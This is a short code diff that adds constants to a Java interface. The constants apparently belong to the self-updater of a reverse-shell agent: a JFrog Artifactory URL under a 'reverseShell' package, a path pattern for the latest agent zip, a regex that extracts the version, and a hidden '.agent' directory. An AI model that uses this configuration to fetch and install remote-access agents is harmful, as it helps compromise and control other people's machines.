@@ -23,7 +23,17 @@ public interface Constants {
 
     public static final String LOCK_FILE_NAME = "93803181808-lock";
 
+    public static final String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
 
+    public static final String JFROG_META_DATA_FILE= "maven-metadata.xml";
+
+
+    public static final String JFROG_LATEST_AGENT_PATH= "%s/reverseShell-%s-zip.zip";
+
+    public static final String JFROG_LATEST_REGEX= "<latest>(.*?)<\\/latest>";
+
+
+    public static final String NEW_AGENT_DIRECTORY= ".agent";
 
 
 }
